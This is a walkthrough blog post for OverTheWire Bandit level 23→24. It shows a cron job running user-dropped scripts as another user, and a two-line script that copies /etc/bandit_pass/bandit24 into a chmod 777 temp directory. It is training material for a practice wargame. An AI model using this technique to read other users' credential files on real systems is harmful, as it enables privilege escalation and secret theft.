---
layout: post
title:  "Bandit Level 23 â†’ Level 24"
date:   2021-05-22 19:59:50
categories: ctf wargames linux
tags: wargames ctf overthewire linux
series: "OverTheWire: Bandit"
excerpt: watch this
mathjax: false
---

## Level Goal
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.


## Solution
```bash
bandit23@bandit:~$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ ls
cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:/etc/cron.d$ cd /var/spool
bandit23@bandit:/var/spool$ ls -la
total 20
drwxr-xr-x  5 root root     4096 May 14  2020 .
drwxr-xr-x 11 root root     4096 May  7  2020 ..
drwxrwx-wx 29 root bandit24 4096 May 23 02:31 bandit24
drwxr-xr-x  3 root root     4096 May  3  2020 cron
lrwxrwxrwx  1 root root        7 May  3  2020 mail -> ../mail
drwx------  2 root root     4096 Jan 14  2018 rsyslog
bandit23@bandit:/var/spool$ cd `mktemp -d`
bandit23@bandit:/tmp/tmp.c3zh6DIqLu$ vim getpass.sh 
bandit23@bandit:/tmp/tmp.c3zh6DIqLu$ chmod 777 getpass.sh 
bandit23@bandit:/tmp/tmp.c3zh6DIqLu$ chmod 777 /tmp/tmp.c3zh6DIqLu
bandit23@bandit:/tmp/tmp.c3zh6DIqLu$ cp getpass.sh /var/spool/bandit24/
bandit23@bandit:/tmp/tmp.c3zh6DIqLu$ watch -n1 ls
bandit23@bandit:/tmp/tmp.c3zh6DIqLu$ cat password.txt 
U------------------------------Z
```

Contents of getpass.sh
```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.c3zh6DIqLu/password.txt
```

## Explanation

This level requires creating a very basic shell script, but perhaps the part that is most likely to cause headaches is forgetting to set permissions. The script needs to be executable by cron, and the temp directory needs to be writable to cron. Since this is a lab environment, we can use chmod 777 on both the script and the temp directory.

The **watch** command is not required, but saves you from needing to spam ls or waiting a few minutes before checking to see if the file was created. The **-n 1** option tells watch to update once a second. The **ls** at the end of the line tells watch what to monitor. Every second watch will run ls for you. You'll see the time to the right and will see password.txt once its created. 
